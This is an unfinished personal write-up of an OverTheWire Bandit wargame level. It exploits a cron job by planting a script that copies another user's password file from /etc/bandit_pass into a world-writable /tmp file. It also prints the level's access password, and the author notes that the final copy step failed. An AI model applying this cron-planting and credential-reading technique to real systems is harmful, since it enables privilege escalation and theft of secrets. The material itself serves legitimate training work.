# Level23a24

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solucion
```bash
bandit23@bandit:~$ ls -la /etc/cron.d
total 48
drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
drwxr-xr-x 110 root root 4096 Sep  8 12:09 ..
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 23 13:49 .placeholder
-rw-r--r--   1 root root  396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cd /var/spool/bandit24
bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/passtemporal
bandit23@bandit:/var/spool/bandit24$ cd /tmp/passtemporal
bandit23@bandit:/tmp/passtemporal$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/passtempor
al/password" > mine.sh
bandit23@bandit:/tmp/passtemporal$ chmod 777 mine.sh
bandit23@bandit:/tmp/passtemporal$ cat mine.sh
cat /etc/bandit_pass/bandit24 >> /tmp/passtempor
al/password
bandit23@bandit:/tmp/passtemporal$ touch password
bandit23@bandit:/tmp/passtemporal$ chmod 666 password
bandit23@bandit:/tmp/passtemporal$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Sep 12 03:32 password
bandit23@bandit:/tmp/passtemporal$ cp mine.sh
cp: missing destination file operand after 'mine.sh'
Try 'cp --help' for more information.
```


## Notas adicionales
No lo logre resolver el problema ya que me daba un error con el cp, pero se que debia esperar un momento a que el script terminara de correr para hacerle un cat al archivo password y ver la constrasenia 

## Referencias

